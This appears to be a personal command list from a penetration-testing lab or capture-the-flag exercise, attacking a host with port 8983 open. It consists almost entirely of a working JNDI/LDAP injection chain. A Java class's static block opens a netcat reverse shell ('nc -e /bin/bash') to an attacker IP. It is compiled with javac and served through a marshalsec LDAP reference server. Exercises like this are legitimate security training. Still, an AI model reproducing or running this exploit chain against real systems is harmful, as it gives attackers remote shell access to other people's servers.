command lists [need to move this file to desktop/sample_report/README.md]
----------------------------------------------
1. nmap result

```
22/tcp    open     ssh
111/tcp   open     rpcbind
8983/tcp  open     unknown
```

2. create exploit.java

```java
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash 10.4.5.89 9001");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```
3. create exploit.class with javac

`javac exploit.java -source 8 -target 8`

4. using java unmarshaller to run LDAP Reference Server

```bash
git clone https://github.com/mbechler/marshalsec
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit"
```
